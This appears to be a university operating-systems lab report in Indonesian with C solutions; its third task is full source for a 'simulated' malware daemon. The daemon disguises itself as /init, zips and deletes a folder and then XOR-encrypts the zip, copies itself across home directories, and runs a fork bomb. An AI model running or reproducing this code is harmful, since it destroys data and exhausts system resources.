# Sisop-2-2025-IT20

- **Mey Rosalina NRP 5027241004**
- **Rizqi Akbar Sukirman Putra NRP 5027241044**
- **M. Alfaeran Auriga Ruswandi NRP 5027241115**

# Soal 1
**Membuat action.c yang memungkinkan untuk memproses kumpulan file teks terenkripsi yang disimpan dalam arsip `.zip`.**

Kodenya:
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <ctype.h>
#include <unistd.h>

#define ZIP_FILE "Clues.zip"
#define CLUES_DIR "Clues"
#define FILTERED_DIR "Filtered"
#define COMBINED_FILE "Combined.txt"
#define DECODED_FILE "Decoded.txt"

void download_and_extract() {
    struct stat st;
    if (stat(CLUES_DIR, &st) == 0) {
        printf("📦 Direktori '%s' sudah ada. Skip download.\n", CLUES_DIR);
        return;
    }

    printf("⬇️  Mendownload dan extract %s...\n", ZIP_FILE);
    system("curl -L -o Clues.zip \"https://drive.usercontent.google.com/u/0/uc?id=1xFn1OBJUuSdnApDseEczKhtNzyGekauK&export=download\"");
    system("unzip -o Clues.zip -d Clues > /dev/null");
    remove(ZIP_FILE);
}

void filter_files() {
    printf("🔍 >>> Mode: Filter sedang dijalankan\n");

    DIR *dir, *subdir;
    struct dirent *entry, *file;
    char path[256], src[256], dst[256];

    mkdir(FILTERED_DIR, 0755);

    snprintf(path, sizeof(path), "%s/%s", CLUES_DIR, CLUES_DIR); // path fix
    dir = opendir(path);
    if (!dir) {
        perror("Gagal membuka direktori Clues/Clues");
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR && strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
            char subpath[256];
            snprintf(subpath, sizeof(subpath), "%s/%s", path, entry->d_name);
            subdir = opendir(subpath);
            if (!subdir) continue;

            while ((file = readdir(subdir)) != NULL) {
                if (file->d_type == DT_REG) {
                    if (strlen(file->d_name) == 5 &&
                        (isdigit(file->d_name[0]) || isalpha(file->d_name[0])) &&
                        strcmp(file->d_name + 1, ".txt") == 0) {

                        printf("✔ File valid ditemukan: %s\n", file->d_name);
                        snprintf(src, sizeof(src), "%s/%s", subpath, file->d_name);
                        snprintf(dst, sizeof(dst), "%s/%s", FILTERED_DIR, file->d_name);
                        rename(src, dst);
                    }
                }
            }
            closedir(subdir);
        }
    }
    closedir(dir);

    // Hapus Clues
    char remove_cmd[256];
    snprintf(remove_cmd, sizeof(remove_cmd), "rm -rf %s", CLUES_DIR);
    system(remove_cmd);

    // Check kalau folder kosong
    DIR *check = opendir(FILTERED_DIR);
    struct dirent *cek;
    int filecount = 0;
    while ((cek = readdir(check)) != NULL) {
        if (cek->d_type == DT_REG) filecount++;
    }
    closedir(check);

    if (filecount == 0) {
        printf("⚠️  Tidak ada file valid yang ditemukan dan difilter. Pastikan format filenya benar!\n");
    }
}

int compare_filename(const void *a, const void *b) {
    return strcmp(*(char **)a, *(char **)b);
}

void combine_files() {
    printf("📦 >>> Mode: Combine sedang dijalankan\n");

    DIR *dir = opendir(FILTERED_DIR);
    struct dirent *entry;
    char *numbers[100], *letters[100];
    int num_count = 0, letter_count = 0;
    FILE *out = fopen(COMBINED_FILE, "w");

    if (!dir || !out) {
        perror("Gagal membuka direktori atau file output");
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG && strlen(entry->d_name) == 5 && strcmp(entry->d_name + 1, ".txt") == 0) {
            char *name = strdup(entry->d_name);
            if (isdigit(name[0])) {
                numbers[num_count++] = name;
            } else if (isalpha(name[0])) {
                letters[letter_count++] = name;
            }
        }
    }

    qsort(numbers, num_count, sizeof(char *), compare_filename);
    qsort(letters, letter_count, sizeof(char *), compare_filename);

    int i = 0;
    while (i < num_count || i < letter_count) {
        if (i < num_count) {
            char path[256], c;
            snprintf(path, sizeof(path), "%s/%s", FILTERED_DIR, numbers[i]);
            FILE *f = fopen(path, "r");
            if (f) {
                while ((c = fgetc(f)) != EOF) fputc(c, out);
                fclose(f);
            }
            remove(path);
        }
        if (i < letter_count) {
            char path[256], c;
            snprintf(path, sizeof(path), "%s/%s", FILTERED_DIR, letters[i]);
            FILE *f = fopen(path, "r");
            if (f) {
                while ((c = fgetc(f)) != EOF) fputc(c, out);
                fclose(f);
            }
            remove(path);
        }
        i++;
    }

    fclose(out);
    closedir(dir);
}

void decode_file() {
    printf("🔐 >>> Mode: Decode sedang dijalankan\n");

    FILE *in = fopen(COMBINED_FILE, "r");
    FILE *out = fopen(DECODED_FILE, "w");
    if (!in || !out) {
        perror("Gagal membuka file Combined atau membuat Decoded");
        return;
    }

    char ch;
    while ((ch = fgetc(in)) != EOF) {
        if (isalpha(ch)) {
            if (isupper(ch))
                ch = 'A' + (ch - 'A' + 13) % 26;
            else
                ch = 'a' + (ch - 'a' + 13) % 26;
        }
        fputc(ch, out);
    }

    fclose(in);
    fclose(out);
    printf("✅ Decoded disimpan di '%s'\n", DECODED_FILE);
}

int main(int argc, char *argv[]) {
    if (argc == 1) {
        download_and_extract();
    } else if (argc == 3 && strcmp(argv[1], "-m") == 0) {
        if (strcmp(argv[2], "Filter") == 0) {
            filter_files();
        } else if (strcmp(argv[2], "Combine") == 0) {
            combine_files();
        } else if (strcmp(argv[2], "Decode") == 0) {
            decode_file();
        } else {
            printf("❌ Mode tidak dikenali. Gunakan:\n");
            printf("   ./action -m Filter\n");
            printf("   ./action -m Combine\n");
            printf("   ./action -m Decode\n");
        }
    } else {
        printf("❌ Format salah. Gunakan:\n");
        printf("   ./action               → untuk download dan extract Clues.zip\n");
        printf("   ./action -m Filter     → untuk filter file valid\n");
        printf("   ./action -m Combine    → untuk gabung isi file\n");
        printf("   ./action -m Decode     → untuk decode ROT13\n");
    }

    return 0;
}
```
**Penjelasan Fungsi Utama**

***1. download_and_extract()***
Mengecek apakah folder Clues/ sudah ada. Jika belum, akan mengunduh file ZIP dan mengekstraknya menggunakan curl dan unzip.

***2. filter_files()***
Memindai folder Clues/Clues/* untuk mencari file .txt yang valid. File valid dipindahkan ke folder Filtered/. Setelah itu folder Clues/ dihapus.

***3. combine_files()***
Menggabungkan isi file dari folder Filtered/ ke dalam Combined.txt. File diproses bergantian antara file yang diawali angka dan huruf. Isi file dibaca karakter demi karakter dan langsung ditulis ke file gabungan.

***4. decode_file()***
Melakukan dekripsi ROT13 terhadap isi Combined.txt. Karakter huruf akan digeser 13 posisi dalam alfabet. Hasilnya disimpan dalam Decoded.txt.

**Output yang didapat:**
```
⬇️  Mendownload dan extract Clues.zip...
🔍 >>> Mode: Filter sedang dijalankan
✔ File valid ditemukan: 1.txt
✔ File valid ditemukan: a.txt
📦 >>> Mode: Combine sedang dijalankan
🔐 >>> Mode: Decode sedang dijalankan
✅ Decoded disimpan di 'Decoded.txt'
BewareOfAmpy
```
Hasil yang didapatkan adalah BewareOfAmpy yang apabila kita masukkan kode tersebut, akan mengarahkan kita ke halaman baru.

# Soal 2
**Membuat kode starterkit.c yang merupakan program daemon yang berjalan di latar belakang dan bertugas mendekripsi (decode) nama file dari format Base64**

Kodenya:
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <signal.h>
#include <fcntl.h>

#define STARTER_DIR "starter_kit"
#define QUARANTINE_DIR "quarantine"
#define LOG_FILE "activity.log"
#define PID_FILE "decryptor.pid"

void write_log(const char *message) {
    FILE *log = fopen(LOG_FILE, "a");
    if (log == NULL) return;

    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    char timebuf[64];
    strftime(timebuf, sizeof(timebuf), "[%d-%m-%Y][%H:%M:%S]", t);

    fprintf(log, "%s - %s\n", timebuf, message);
    fclose(log);
}

char *decode_base64(const char *src) {
    FILE *fp = fopen("tmp.b64", "w");
    fprintf(fp, "%s", src);
    fclose(fp);

    system("base64 -d tmp.b64 > tmp.txt 2>/dev/null");

    fp = fopen("tmp.txt", "r");
    if (!fp) return NULL;

    static char buf[256];
    fgets(buf, sizeof(buf), fp);
    fclose(fp);

    remove("tmp.b64");
    remove("tmp.txt");

    size_t len = strlen(buf);
    if (len > 0 && buf[len - 1] == '\n') buf[len - 1] = '\0';

    return buf;
}

void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) {
        char msg[128];
        sprintf(msg, "Successfully started decryption process with PID %d.", pid);
        write_log(msg);

        FILE *fp = fopen(PID_FILE, "w");
        if (fp) {
            fprintf(fp, "%d", pid);
            fclose(fp);
        }
        exit(EXIT_SUCCESS);
    }

    umask(0);
    setsid();
    chdir(".");
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    while (1) {
        DIR *d = opendir(STARTER_DIR);
        if (!d) continue;

        struct dirent *f;
        while ((f = readdir(d)) != NULL) {
            if (f->d_type == DT_REG) {
                char path[256];
                sprintf(path, "%s/%s", STARTER_DIR, f->d_name);

                char *decoded = decode_base64(f->d_name);
                if (decoded && strlen(decoded) > 0) {
                    char new_path[256];
                    sprintf(new_path, "%s/%s", STARTER_DIR, decoded);
                    rename(path, new_path);
                }
            }
        }
        closedir(d);
        sleep(5);
    }
}

void move_files(const char *src, const char *dest, const char *log_action) {
    DIR *d = opendir(src);
    if (!d) return;

    struct dirent *f;
    while ((f = readdir(d)) != NULL) {
        if (f->d_type == DT_REG) {
            char oldpath[256], newpath[256];
            sprintf(oldpath, "%s/%s", src, f->d_name);
            sprintf(newpath, "%s/%s", dest, f->d_name);
            rename(oldpath, newpath);

            char msg[256];
            sprintf(msg, "%s - Successfully %s.", f->d_name, log_action);
            write_log(msg);
        }
    }
    closedir(d);
}

void eradicate_files() {
    DIR *d = opendir(QUARANTINE_DIR);
    if (!d) return;

    struct dirent *f;
    while ((f = readdir(d)) != NULL) {
        if (f->d_type == DT_REG) {
            char path[256];
            sprintf(path, "%s/%s", QUARANTINE_DIR, f->d_name);
            remove(path);

            char msg[256];
            sprintf(msg, "%s - Successfully deleted.", f->d_name);
            write_log(msg);
        }
    }
    closedir(d);
}

void shutdown_daemon() {
    FILE *fp = fopen(PID_FILE, "r");
    if (!fp) return;

    int pid;
    fscanf(fp, "%d", &pid);
    fclose(fp);

    if (kill(pid, SIGTERM) == 0) {
        char msg[128];
        sprintf(msg, "Successfully shut off decryption process with PID %d.", pid);
        write_log(msg);
        remove(PID_FILE);
    }
}

int main(int argc, char *argv[]) {
    mkdir(STARTER_DIR, 0777);
    mkdir(QUARANTINE_DIR, 0777);

    if (argc != 2) {
        printf("Penggunaan: ./starterkit --decrypt / --quarantine / --return / --eradicate / --shutdown\n");
        return 1;
    }

    if (strcmp(argv[1], "--decrypt") == 0) {
        daemonize();
    } else if (strcmp(argv[1], "--quarantine") == 0) {
        move_files(STARTER_DIR, QUARANTINE_DIR, "moved to quarantine directory");
    } else if (strcmp(argv[1], "--return") == 0) {
        move_files(QUARANTINE_DIR, STARTER_DIR, "returned to starter kit directory");
    } else if (strcmp(argv[1], "--eradicate") == 0) {
        eradicate_files();
    } else if (strcmp(argv[1], "--shutdown") == 0) {
        shutdown_daemon();
    } else {
        printf("Argumen tidak dikenali.\n");
    }

    return 0;
}
```
**Penjelasan Cara Kerja**

***Proses Daemonisasi (--decrypt)***
Menggunakan fork() untuk membuat proses anak. Proses anak menjadi daemon dan memeriksa isi direktori starter_kit/ setiap 5 detik. Nama file yang dikodekan dalam format Base64 akan di-decode dan rename ke nama asli. PID dari proses daemon disimpan di file decryptor.pid.

***Base64 --Decoding***
Dilakukan dengan tool eksternal base64 -d, menggunakan sistem pipe.

***--quarantine & --return***
Memindahkan semua file antar direktori (starter_kit ↔ quarantine). Aktivitas dicatat ke activity.log.

***--eradicate***
Menghapus semua file di direktori quarantine. File yang dihapus juga dicatat di log.

***--shutdown***
Membaca PID dari decryptor.pid. Mengirim sinyal SIGTERM untuk menghentikan proses daemon

**Output pada activity log**
```
rikishi@Ambatugopro:~/soal1_shift2/soal_2$ cat activity.log
[16-04-2025][18:28:50] - Successfully started decryption process with PID 2071.
[16-04-2025][18:29:24] - �  - Successfully moved to quarantine directory.
[16-04-2025][18:29:59] - �  - Successfully returned to starter kit directory.
[16-04-2025][18:30:27] - Successfully shut off decryption process with PID 2071.
```

**Revisi :**
Penambahan kode untuk mendownload starter_kit pada web dan langsung mengunzip file.

Dengan kode:
```
void download_and_extract_zip() {
    const char *url = "https://drive.usercontent.google.com/u/0/uc?id=1_5GxIGfQr3mNKuavJbte_AoRkEQLXSKS&export=download";
    const char *zipfile = "starter_kit.zip";

    write_log("Starting download of starter_kit.zip...");

    char cmd_download[512];
    sprintf(cmd_download, "wget -q --no-check-certificate -O %s \"%s\"", zipfile, url);
    int dl_status = system(cmd_download);

    if (dl_status != 0) {
        write_log("Failed to download starter_kit.zip.");
        return;
    }

    write_log("Download successful. Starting unzip process...");

    char cmd_unzip[256];
    sprintf(cmd_unzip, "unzip -o %s -d . > /dev/null 2>&1", zipfile);
    int unzip_status = system(cmd_unzip);

    if (unzip_status == 0) {
        write_log("Unzip successful.");
        remove(zipfile); // opsional
    } else {
        write_log("Failed to unzip starter_kit.zip.");
    }
}
```

# Soal 3
# 💀 Malware dokrodokrodok: Daemon, Infeksi, Fork Bomb & Mining

## Deskripsi
Program ini merupakan simulasi malware daemon yang memiliki berbagai fitur berbahaya💀 seperti:
- Menyamar sebagai proses `/init`
- Mengenkripsi folder menggunakan ZIP dan XOR (`wannacryptor`)
- Menyebar ke seluruh subdirektori di `$HOME` (`trojan.wrm`)
- Menjalankan fork bomb (`rodok.exe`)
- Melakukan mining hash palsu (`mine-crafter-XX`) dan mencatat ke log

---
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <string.h>
#include <signal.h>
#include <dirent.h>
#include <time.h>
#include <limits.h>
#include <syslog.h>
#include <sys/wait.h> 

#define PATH_MAX 4096
extern char **environ;

void initialize_daemon() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    if (setsid() < 0) exit(EXIT_FAILURE);
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);

    umask(0);
    if (chdir("/") != 0) exit(EXIT_FAILURE);

    for (int fd = 0; fd < sysconf(_SC_OPEN_MAX); fd++) {
        close(fd);
    }
}

void disguise_process(int argc, char **argv) {
    environ = NULL;
    prctl(PR_SET_NAME, "/init", 0, 0, 0);
    if (argc > 0 && argv[0]) {
        memset(argv[0], 0, strlen(argv[0])); 
        snprintf(argv[0], 64, "/init    "); 
    }
}

void xorfile(const char *filename, unsigned int key) {
    FILE *in = fopen(filename, "rb");
    if (!in) return;

    char tmpfile[PATH_MAX];
    snprintf(tmpfile, sizeof(tmpfile), "%s.tmp", filename);
    FILE *out = fopen(tmpfile, "wb");
    if (!out) {
        fclose(in);
        return;
    }

    int ch;
    while ((ch = fgetc(in)) != EOF) {
        fputc(ch ^ key, out);
    }

    fclose(in);
    fclose(out);

    remove(filename);
    rename(tmpfile, filename);
}

void encrypt_file(const char *folder_path, unsigned int key) {
    char zipfile[PATH_MAX];
    snprintf(zipfile, sizeof(zipfile), "%s.zip", folder_path);

    pid_t zip_pid = fork();
    if (zip_pid == 0) {
        execlp("zip", "zip", "-r", "-q", zipfile, folder_path, (char *)NULL);
        exit(EXIT_FAILURE);
    } else if (zip_pid > 0) {
        int status;
        waitpid(zip_pid, &status, 0);
        if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
            pid_t rm_pid = fork();
            if (rm_pid == 0) {
                execlp("rm", "rm", "-rf", folder_path, (char *)NULL);
                exit(EXIT_FAILURE);
            } else if (rm_pid > 0) {
                waitpid(rm_pid, &status, 0);
                if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
                    xorfile(zipfile, key);
                }
            }
        }
    }
}

void replicate_self_to_home(const char *home_dir) {
    DIR *dir = opendir(home_dir);
    if (!dir) return;

    struct dirent *entry;
    char current_path[PATH_MAX];
    char self_path[PATH_MAX];

    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (len == -1) {
        closedir(dir);
        return;
    }
    self_path[len] = '\0';
    const char *filename = strrchr(self_path, '/');
    filename = filename ? filename + 1 : self_path;

    while ((entry = readdir(dir)) != NULL) {
        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) continue;

        snprintf(current_path, sizeof(current_path), "%s/%s", home_dir, entry->d_name);
        struct stat st;
        if (stat(current_path, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            char destination[PATH_MAX];
            snprintf(destination, sizeof(destination), "%s/%s", current_path, filename);
            FILE *src = fopen(self_path, "rb");
            FILE *dest = fopen(destination, "wb");
            if (!src || !dest) {
                if (src) fclose(src);
                if (dest) fclose(dest);
                continue;
            }
            char buffer[4096];
            size_t bytes;
            while ((bytes = fread(buffer, 1, sizeof(buffer), src)) > 0) {
                fwrite(buffer, 1, bytes, dest);
            }
            fclose(src);
            fclose(dest);
        }
    }

    closedir(dir);
}
void child_wannacryptor(const char *target_path, unsigned int key, int argc, char **argv) {
    pid_t child = fork();
    if (child == 0) {
        prctl(PR_SET_NAME, "wannacryptor", 0, 0, 0);
        if (argc > 0) {
            memset(argv[0], 0, 64);
            strncpy(argv[0], "wannacryptor", 64);
        }
        while (1) {
            encrypt_file(target_path, key);
            sleep(30);
        }
    }
}

void child_trojan_wrm(int argc, char **argv) {
    pid_t child = fork();
    if (child == 0) {
        prctl(PR_SET_NAME, "trojan.wrm", 0, 0, 0);
        if (argc > 0) {
            memset(argv[0], 0, 64);
            strncpy(argv[0], "trojan.wrm", 64);
        }

        const char *home_dir = getenv("HOME");
        if (!home_dir) exit(EXIT_FAILURE);

        while (1) {
            replicate_self_to_home(home_dir);
            sleep(30);
        }
    }
}

void rodok_fork_bomb() {
    while (1) {
        if (fork() == 0) {
            rodok_fork_bomb();
        }
    }
}

void child_rodok(int argc, char **argv) {
    pid_t rodok = fork();
    if (rodok == 0) {
        prctl(PR_SET_NAME, "rodok.exe", 0, 0, 0);
        if (argc > 0) {
            memset(argv[0], 0, 64);
            strncpy(argv[0], "rodok.exe", 64);
        }
        rodok_fork_bomb();
    }
}

void mine_hash(int id) {
    prctl(PR_SET_PDEATHSIG, SIGTERM);
    char hash[65];
    srand(time(NULL) ^ id);
    while (1) {
        for (int i = 0; i < 64; i++) {
            hash[i] = "0123456789abcdef"[rand() % 16];
        }
        hash[64] = '\0';

        time_t now = time(NULL);
        struct tm *t = localtime(&now);
        char log_entry[128];
        snprintf(log_entry, sizeof(log_entry),
            "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
            t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
            t->tm_hour, t->tm_min, t->tm_sec, id, hash);

        FILE *log = fopen("/tmp/.miner.log", "a");
        if (log) {
            fputs(log_entry, log);
            fclose(log);
        }

        sleep((rand() % 28) + 3);
    }
}

void start_mining(int max_miners) {
    for (int i = 0; i < max_miners; i++) {
        if (fork() == 0) {
            mine_hash(i);
            exit(EXIT_SUCCESS);
        }
    }
}


int main(int argc, char *argv[]) {
    initialize_daemon();
    disguise_process(argc, argv);

    child_wannacryptor("/home/Downloads/Praktikum-2-Sisop/soal_3/data", (unsigned int)time(NULL), argc, argv);
    child_trojan_wrm(argc, argv);
    child_rodok(argc, argv);

    if (fork() == 0) {
        while (1) {
            replicate_self_to_home("/home/target");
            sleep(30);
        }
    }

    if (fork() == 0) {
        int max_miners = 3;
        if (max_miners < 3) max_miners = 3;
        start_mining(max_miners);
        while (1) sleep(60);
    }

    while (1) sleep(60);
    return 0;
}
```

## 🔧 Struktur Fitur

### 🟣 a. Malware ini bekerja secara daemon dan menginfeksi perangkat korban dan menyembunyikan diri dengan mengganti namanya menjadi /init. 

```c
void initialize_daemon() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    if (setsid() < 0) exit(EXIT_FAILURE);
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);

    umask(0);
    if (chdir("/") != 0) exit(EXIT_FAILURE);

    for (int fd = 0; fd < sysconf(_SC_OPEN_MAX); fd++) {
        close(fd);
    }
}

void disguise_process(int argc, char **argv) {
    environ = NULL;
    prctl(PR_SET_NAME, "/init", 0, 0, 0);
    if (argc > 0 && argv[0]) {
        memset(argv[0], 0, strlen(argv[0])); 
        snprintf(argv[0], 64, "/init    "); 
    }
}
```
- initialize_daemon() mengubah proses menjadi daemon dengan melepaskan kontrol terminal dan menutup file descriptor.

- disguise_process() mengganti nama proses menjadi /init serta membersihkan argv[0] dan environ agar tidak mudah terdeteksi.
  
### 🟣 b. Anak fitur pertama adalah sebuah encryptor bernama wannacryptor yang akan memindai directory saat ini dan mengenkripsi file dan folder (serta seluruh isi folder) di dalam directory tersebut menggunakan xor dengan timestamp saat program dijalankan. Encryptor pada folder dapat bekerja dengan dua cara, mengenkripsi seluruh isi folder secara rekursif, atau mengubah folder dan isinya ke dalam zip lalu mengenkripsi zip tersebut. Jika menggunakan metode rekursif, semua file di dalam folder harus terenkripsi , dari isi folder paling dalam sampai ke current directory, dan tidak mengubah struktur folder Jika menggunakan metode zip, folder yang dienkripsi harus dihapus oleh program. Pembagian metode sebagai berikut: Untuk kelompok ganjil menggunakan metode rekursif, dan kelompok genap menggunakan metode zip.

```c
void xorfile(const char *filename, unsigned int key) {
    FILE *in = fopen(filename, "rb");
    if (!in) return;

    char tmpfile[PATH_MAX];
    snprintf(tmpfile, sizeof(tmpfile), "%s.tmp", filename);
    FILE *out = fopen(tmpfile, "wb");
    if (!out) {
        fclose(in);
        return;
    }

    int ch;
    while ((ch = fgetc(in)) != EOF) {
        fputc(ch ^ key, out);
    }

    fclose(in);
    fclose(out);

    remove(filename);
    rename(tmpfile, filename);
}

void encrypt_file(const char *folder_path, unsigned int key) {
    char zipfile[PATH_MAX];
    snprintf(zipfile, sizeof(zipfile), "%s.zip", folder_path);

    pid_t zip_pid = fork();
    if (zip_pid == 0) {
        execlp("zip", "zip", "-r", "-q", zipfile, folder_path, (char *)NULL);
        exit(EXIT_FAILURE);
    } else if (zip_pid > 0) {
        int status;
        waitpid(zip_pid, &status, 0);
        if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
            pid_t rm_pid = fork();
            if (rm_pid == 0) {
                execlp("rm", "rm", "-rf", folder_path, (char *)NULL);
                exit(EXIT_FAILURE);
            } else if (rm_pid > 0) {
                waitpid(rm_pid, &status, 0);
                if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
                    xorfile(zipfile, key);
                }
            }
        }
    }
}
void child_wannacryptor(const char *target_path, unsigned int key, int argc, char **argv) {
    pid_t child = fork();
    if (child == 0) {
        prctl(PR_SET_NAME, "wannacryptor", 0, 0, 0);
        if (argc > 0) {
            memset(argv[0], 0, 64);
            strncpy(argv[0], "wannacryptor", 64);
        }
        while (1) {
            encrypt_file(target_path, key);
            sleep(30);
        }
    }
}
```
- Men-zip direktori target lalu mengenkripsinya menggunakan XOR.

- Nama proses disamarkan menjadi wannacryptor.

- Proses ini berjalan terus menerus setiap 30 detik.
  
### 🟣 c. Anak fitur kedua yang bernama trojan.wrm berfungsi untuk menyebarkan malware ini kedalam mesin korban dengan cara membuat salinan binary malware di setiap directory yang ada di home user.

```c
void replicate_self_to_home(const char *home_dir) {
    DIR *dir = opendir(home_dir);
    if (!dir) return;

    struct dirent *entry;
    char current_path[PATH_MAX];
    char self_path[PATH_MAX];

    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (len == -1) {
        closedir(dir);
        return;
    }
    self_path[len] = '\0';
    const char *filename = strrchr(self_path, '/');
    filename = filename ? filename + 1 : self_path;

    while ((entry = readdir(dir)) != NULL) {
        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) continue;

        snprintf(current_path, sizeof(current_path), "%s/%s", home_dir, entry->d_name);
        struct stat st;
        if (stat(current_path, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            char destination[PATH_MAX];
            snprintf(destination, sizeof(destination), "%s/%s", current_path, filename);
            FILE *src = fopen(self_path, "rb");
            FILE *dest = fopen(destination, "wb");
            if (!src || !dest) {
                if (src) fclose(src);
                if (dest) fclose(dest);
                continue;
            }
            char buffer[4096];
            size_t bytes;
            while ((bytes = fread(buffer, 1, sizeof(buffer), src)) > 0) {
                fwrite(buffer, 1, bytes, dest);
            }
            fclose(src);
            fclose(dest);
        }
    }

    closedir(dir);
}
```
- Proses akan menyalin executable saat ini ke semua subdirektori dalam direktori $HOME.

- Dilakukan setiap 30 detik.

### 🟣 d. Anak fitur pertama dan kedua terus berjalan secara berulang ulang selama malware masih hidup dengan interval 30 detik.

```c
 while (1) {
            encrypt_file(target_path, key);
            sleep(30);
        }
 while (1) {
            replicate_self_to_home(home_dir);
            sleep(30);
        }
```

### 🟣 e. Anak fitur ketiga ini sangat unik. Dinamakan rodok.exe, proses ini akan membuat sebuah fork bomb di dalam perangkat korban.

```c
void rodok_fork_bomb() {
    while (1) {
        if (fork() == 0) {
            //rodok_fork_bomb();
        }
    }
}

void child_rodok(int argc, char **argv) {
    pid_t rodok = fork();
    if (rodok == 0) {
        prctl(PR_SET_NAME, "rodok.exe", 0, 0, 0);
        if (argc > 0) {
            memset(argv[0], 0, 64);
            strncpy(argv[0], "rodok.exe", 64);
        }
        rodok_fork_bomb();
    }
}
```
- Fork bomb dijalankan terus menerus, menghasilkan proses anak secara rekursif hingga sistem kehabisan resources.

### 🟣 f. Konon katanya malware ini dibuat oleh Andriana karena dia sedang memerlukan THR. Karenanya, Andriana menambahkan fitur pada fork bomb tadi dimana setiap fork dinamakan mine-crafter-XX (XX adalah nomor dari fork, misal fork pertama akan menjadi mine-crafter-0) dan tiap fork akan melakukan cryptomining. Cryptomining disini adalah membuat sebuah hash hexadecimal (base 16) random sepanjang 64 char. Masing masing hash dibuat secara random dalam rentang waktu 3 detik - 30 detik. Sesuaikan jumlah maksimal mine-crafter dengan spesifikasi perangkat, minimal 3 (Jangan dipaksakan sampai lag, secukupnya saja untuk demonstrasi)

```c
void mine_hash(int id) {
    prctl(PR_SET_PDEATHSIG, SIGTERM);
    char hash[65];
    srand(time(NULL) ^ id);
    while (1) {
        for (int i = 0; i < 64; i++) {
            hash[i] = "0123456789abcdef"[rand() % 16];
        }
        hash[64] = '\0';

        time_t now = time(NULL);
        struct tm *t = localtime(&now);
        char log_entry[128];
        snprintf(log_entry, sizeof(log_entry),
            "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
            t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
            t->tm_hour, t->tm_min, t->tm_sec, id, hash);

        FILE *log = fopen("/tmp/.miner.log", "a");
        if (log) {
            fputs(log_entry, log);
            fclose(log);
        }

        sleep((rand() % 28) + 3);
    }
}

void start_mining(int max_miners) {
    for (int i = 0; i < max_miners; i++) {
        if (fork() == 0) {
            mine_hash(i);
            exit(EXIT_SUCCESS);
        }
    }
}
```
- Membuat proses mining sebanyak max_miners (minimal 3), masing-masing mencetak hash palsu ke /tmp/.miner.log.

- Hash baru dibuat setiap 3–30 detik.

### 🟣 g. Lalu mine-crafter-XX dan mengumpulkan hash yang sudah dibuat dan menyimpannya di dalam file /tmp/.miner.log dengan format: [YYYY-MM-DD hh:mm:ss][Miner XX] hash. Dimana XX adalah ID mine-crafter yang membuat hash tersebut. 

```c
while (1) {
        for (int i = 0; i < 64; i++) {
            hash[i] = "0123456789abcdef"[rand() % 16];
        }
        hash[64] = '\0';

        time_t now = time(NULL);
        struct tm *t = localtime(&now);
        char log_entry[128];
        snprintf(log_entry, sizeof(log_entry),
            "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
            t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
            t->tm_hour, t->tm_min, t->tm_sec, id, hash);

        FILE *log = fopen("/tmp/.miner.log", "a");
        if (log) {
            fputs(log_entry, log);
            fclose(log);
        }
```

### 🟣 h. Karena mine-crafter-XX adalah anak dari rodok.exe, saat rodok.exe dimatikan, maka seluruh mine-crafter-XX juga akan mati. 

```c
prctl(PR_SET_PDEATHSIG, SIGTERM);
```
- Jika proses induk (rodok.exe) mati, maka seluruh proses mine-crafter-XX juga ikut mati menggunakan PR_SET_PDEATHSIG.

## Malware - Revisi dan Penjelasan

Soal ini adalah simulasi malware dengan fitur enkripsi XOR, replikasi diri, dan penyamaran proses. Kode ini dimodifikasi untuk mencapai beberapa tujuan revisi, termasuk perbaikan struktur, penargetan folder menggunakan Current Working Directory (CWD), dan pengecekan untuk enkripsi dan ZIP.

## 1. Struktur Program

- **Fungsi `initialize_daemon`**: Menyusun proses daemon dengan benar, memulai proses latar belakang, mengubah mode file dan direktori kerja.
- **Fungsi `disguise_process`**: Memastikan proses dijalankan dengan nama yang berbeda, seperti "/init", untuk menyembunyikan malware dari pengawasan.
- **Fungsi `xorfile` dan `encrypt_file`**: Menyediakan mekanisme enkripsi file dan folder dengan XOR dan mengompresi file-folder menggunakan ZIP.
- **Fungsi `replicate_self_to_home`**: Menyebarkan malware ke direktori rumah pengguna dengan menyalin executable malware ke folder tujuan.

Setiap fungsi ini diatur dengan tujuan yang jelas, dan tidak ada pengulangan tugas dalam fungsi yang berbeda.

## 2. Target Folder Menggunakan CWD (Current Working Directory)
